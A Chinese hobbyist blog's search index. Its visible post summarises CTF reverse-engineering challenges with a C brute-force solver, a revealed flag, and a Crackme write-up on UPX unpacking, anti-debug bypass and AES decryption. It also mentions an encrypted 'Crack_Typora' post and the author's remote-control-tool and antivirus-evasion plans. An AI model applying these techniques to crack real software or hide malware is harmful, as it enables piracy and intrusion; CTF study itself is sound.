<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Crack_Typora</title>
      <link href="2022/06/25/Crack_Typora/"/>
      <url>2022/06/25/Crack_Typora/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="66b5d68c02262c8c44e26dc19a3e18ad1fc89027fff4eaa3a33b29ca6f922213"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码输入框上描述性内容</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Recent CTF summary</title>
      <link href="2022/06/11/Recent%20CTF%20summary/"/>
      <url>2022/06/11/Recent%20CTF%20summary/</url>
      
        <content type="html"><![CDATA[<h1 id="Recent-CTF-summary"><a href="#Recent-CTF-summary" class="headerlink" title="Recent CTF summary"></a>Recent CTF summary</h1><p>太久没更博客了，先水一篇，对之前的一些ctf进行一个总结，还有就是对我自己最近给小组出的几道题和我自己ctf中解题脚本的开源，开源地址：<a href="https://github.com/The-Itach1/D0g3-ctf-Re">https://github.com/The-Itach1/D0g3-ctf-Re</a>。</p><p>后面就是去继续完成我的远控了，已经完成了大半多了，由于大二事比较多，最近又是考试，就没怎么去管了，后面放假继续弄，应该还要去弄免杀，ctf就基本上不会看了，现在的环境就这样，题目水平也高低不齐，学不到东西了。</p><p>最后提一句，大二终于结束了。。。</p><h2 id="网刃ctf-re"><a href="#网刃ctf-re" class="headerlink" title="网刃ctf re"></a>网刃ctf re</h2><p>整体都很简单，没什么难度，没想到主办方还发会寄小玩偶，挺可爱。</p><h3 id="freestyle"><a href="#freestyle" class="headerlink" title="freestyle"></a>freestyle</h3><p>爆破两个数就完事了。</p><h3 id="re-easy-func"><a href="#re-easy-func" class="headerlink" title="re_easy_func"></a>re_easy_func</h3><p>两个文件，第一个文件是简单的异或。</p><p>第二个文件是变表base64。</p><h3 id="squid"><a href="#squid" class="headerlink" title="squid"></a>squid</h3><p>挺迷惑，这道题也能是re，修改linux时间，定时打开文件即可。</p><p>开始还以为是打包成elf的py逆向，然后去查找资料，学到了archive_viewer解包的方法，<a href="https://www.jianshu.com/p/3c46eeb32873">https://www.jianshu.com/p/3c46eeb32873</a>，没想到，这道题完全不用解包，解出来也没什么可分析的，还以为和国外的一道py打包的calc.exe很像呢。</p><h3 id="ez-algorithm"><a href="#ez-algorithm" class="headerlink" title="ez_algorithm"></a>ez_algorithm</h3><p>很多字符处理，分析起还是比较痛苦，但是都是单字节，所以完全可以复制ida的代码来爆破，但是需要注意的是得到的答案并不准确，因为里面对一些特殊字符进行了随机处理，替换下即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">//rWto</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[]=<span class="string">&quot;BRUF&#123;E6oU9Ci#J9+6nWAhwMR9n:&#125;&quot;</span>; </span><br><span class="line"><span class="comment">//flag&#123;w3Lc0mE_t0_3NcrYPti0N:&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int8 __fastcall <span class="title">encryption3</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [rsp+10h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">64</span> &amp;&amp; a1 &lt;= <span class="number">70</span> || a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">102</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">84</span> &amp;&amp; a1 &lt;= <span class="number">90</span> || a1 &gt; <span class="number">116</span> &amp;&amp; a1 &lt;= <span class="number">122</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)(a1 - <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">71</span> &amp;&amp; a1 &lt;= <span class="number">77</span> || a1 &gt; <span class="number">103</span> &amp;&amp; a1 &lt;= <span class="number">109</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">77</span> &amp;&amp; a1 &lt;= <span class="number">83</span> || a1 &gt; <span class="number">109</span> &amp;&amp; a1 &lt;= <span class="number">115</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)(a1 - <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">71</span> || a1 == <span class="number">103</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">84</span> || a1 == <span class="number">116</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)(a1 - <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> )</span><br><span class="line">    v2 = <span class="number">105</span> - a1;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int8  <span class="title">encryption2</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">64</span> &amp;&amp; a1 &lt;= <span class="number">90</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)encryption3(a1 + <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)encryption3(a1 - <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> )</span><br><span class="line">    v2 = encryption3(a1);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">encryption</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  __int64 v4; <span class="comment">// kr00_8</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">1012</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+414h] [rbp+394h]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+42Ch] [rbp+3ACh]</span></span><br><span class="line">  <span class="keyword">char</span> *flag_i; <span class="comment">// [rsp+430h] [rbp+3B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+438h] [rbp+3B8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> str1[] = <span class="string">&quot;ckagevdxizblqnwtmsrpufyhoj&quot;</span>;</span><br><span class="line">  <span class="keyword">char</span> str2[] = <span class="string">&quot;TMQZWKGOIAGLBYHPCRJSUXEVND&quot;</span>;</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">num=i;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">char</span> f=<span class="number">0</span>;f&lt;<span class="number">127</span>;f++)</span><br><span class="line">  &#123;</span><br><span class="line">flag_i=&amp;f;</span><br><span class="line">    <span class="keyword">if</span> ( *flag_i &lt;= <span class="string">&#x27;@&#x27;</span> || *flag_i &gt; <span class="string">&#x27;Z&#x27;</span> )      <span class="comment">// 不是大写字符就进入</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *flag_i &lt;= <span class="string">&#x27;`&#x27;</span> || *flag_i &gt; <span class="string">&#x27;z&#x27;</span> )    <span class="comment">// 不是小写字符就进入</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *flag_i == <span class="string">&#x27;_&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> ( v16 + rand() % <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;:&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;&amp;&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">              v21 = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( *flag_i &lt;= <span class="string">&#x27;/&#x27;</span> || *flag_i &gt; <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v21 = *flag_i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v12 = encryption2(*flag_i);</span><br><span class="line">          v21 = v12;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = num % <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( num % <span class="number">4</span> == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)((*flag_i - <span class="number">97</span>) * (num % <span class="number">4</span>) + str1));</span><br><span class="line">          v21 = v9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v7 &gt; <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v7 == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(((*flag_i - <span class="number">97</span>) ^ (num % <span class="number">4</span>)) + str1));</span><br><span class="line">            v21 = v10;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(*flag_i - <span class="number">97</span> + num % <span class="number">4</span> + str1));</span><br><span class="line">            v21 = v11;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(*flag_i - <span class="number">97</span> - num % <span class="number">4</span> + str1));</span><br><span class="line">          v21 = v8;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = num % <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( num % <span class="number">4</span> == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(*flag_i - <span class="number">65</span> + num % <span class="number">4</span> + str2));</span><br><span class="line">        v21 = v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = num * (*flag_i - <span class="number">65</span>);</span><br><span class="line">          v5 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(v4+str2));</span><br><span class="line">          v21 = v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(((*flag_i - <span class="number">65</span>) ^ (num % <span class="number">4</span>)) + str2));</span><br><span class="line">          v21 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !v1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = encryption2(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(*flag_i - <span class="number">65</span> - num % <span class="number">4</span> + str2));</span><br><span class="line">        v21 = v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(v21==enc[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,f);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%c: %c\n&quot;,f,v21);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">encryption();</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><h2 id="2022-Mrctf"><a href="#2022-Mrctf" class="headerlink" title="2022 Mrctf"></a>2022 Mrctf</h2><p>这个比赛也是办大了，今年的题和去年的题也不是一个等次了，也就看了一道题，还没做出来。</p><h3 id="CICADA"><a href="#CICADA" class="headerlink" title="CICADA"></a>CICADA</h3><p>分析了下感觉比较对口，考点也清楚，开始就是解密另一个pe文件，然后内存直接加载运行。</p><p>提取出解密后的pe文件发现无法运行，估计做了一些修改吧，也没关系，完全可以在原程序中调试，但是ida分析解密后的pe文件发现代码量很大，一个很丑的vm，里面的数据运算都会经过一个函数。</p><p>调试来做，通过打硬件断点来分析关键点，可以分析出开始的逻辑为。</p><pre><code>输入为32byte4字节一组每一组&lt;&lt;3&amp;0xffffffff ^其本身^i然后将其还原为32byte</code></pre><p>后面就是有很多32byte的数组进行运算，*和+，然后和一个数进行比较，当时没意识到是解方程组，以为数据根本没规律。</p><p>基本上后面就是解方程组即可了。</p><h2 id="实验班和二次招新道格杯的出题"><a href="#实验班和二次招新道格杯的出题" class="headerlink" title="实验班和二次招新道格杯的出题"></a>实验班和二次招新道格杯的出题</h2><p>一共出了5道题，开源在github上，<a href="https://github.com/The-Itach1/D0g3-ctf-Re">https://github.com/The-Itach1/D0g3-ctf-Re</a>。</p><h3 id="simple1"><a href="#simple1" class="headerlink" title="simple1"></a>simple1</h3><p>简单的异或</p><h3 id="simple2"><a href="#simple2" class="headerlink" title="simple2"></a>simple2</h3><p>花指令和变表base64.</p><h3 id="simple3"><a href="#simple3" class="headerlink" title="simple3"></a>simple3</h3><p>自我创建进程反调试，和xxtea。</p><h3 id="Crackme"><a href="#Crackme" class="headerlink" title="Crackme"></a>Crackme</h3><p>题目难度：中</p><p>hint：这个节区名称怎么有点奇怪？</p><h4 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h4><p>修改了upx节区名称的upx加壳，mfc，NtQueryInformationProcess反调试，Wincrypt.h库的加密函数</p><p>题目地址：<a href="https://pan.baidu.com/s/1wHMTcIjpzA9eHbWx_JcZtg">https://pan.baidu.com/s/1wHMTcIjpzA9eHbWx_JcZtg</a> 提取码：abcd</p><h4 id="wp："><a href="#wp：" class="headerlink" title="wp："></a>wp：</h4><p>先upx脱壳，将节区名称修改为大写的UPX，然后用upx脱壳，或者采用手脱壳的方式，这里发现，无论哪种方式，脱壳后的exe文件无法运行，所以造成了无法调试的情况，对于Mfc程序来说，这将是比较痛苦的，但是也不是不能分析，熟悉32位upx加壳原理的话，都知道调试到最后的jmp就已经完成了对程序的解密，所以完全可以结合脱壳后的文件，找到关键函数，然后使用原未脱壳的文件进行调试，使用alt+b搜索特征而定位到check函数，然后进行调试。</p><p>当然check函数前是有个NtQueryInformationProcess反调试的，这里保留了ntdll这个字符串来方便定位。</p><p>加密过程就是10bytekey 5个一组，一组进行md5，一组进行sha1，然后进行验证，验证的密文需要非调试状态才会是正确的。</p><p>然后将10byte进行md5加密，作为aes的key。</p><p>后面进行对flag进行aes加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">AesDecrypt</span><span class="params">(BYTE* pPassword, DWORD dwPasswordLength, BYTE* pData, DWORD&amp; dwDataLength, DWORD dwBufferLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加实现代码.</span></span><br><span class="line">BOOL bRet = TRUE;</span><br><span class="line">HCRYPTPROV hCryptProv = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTHASH hCryptHash = <span class="literal">NULL</span>;</span><br><span class="line">HCRYPTKEY hCryptKey = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取CSP句柄</span></span><br><span class="line">bRet = CryptAcquireContext(&amp;hCryptProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建HASH对象</span></span><br><span class="line">bRet = CryptCreateHash(hCryptProv, CALG_MD5, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;hCryptHash);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对密钥进行HASH计算</span></span><br><span class="line">bRet = CryptHashData(hCryptHash, pPassword, dwPasswordLength, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用HASH来生成密钥</span></span><br><span class="line">bRet = CryptDeriveKey(hCryptProv, CALG_AES_128, hCryptHash, CRYPT_EXPORTABLE, &amp;hCryptKey);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密数据</span></span><br><span class="line">bRet = CryptDecrypt(hCryptKey, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, pData, &amp;dwDataLength);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭释放</span></span><br><span class="line"><span class="keyword">if</span> 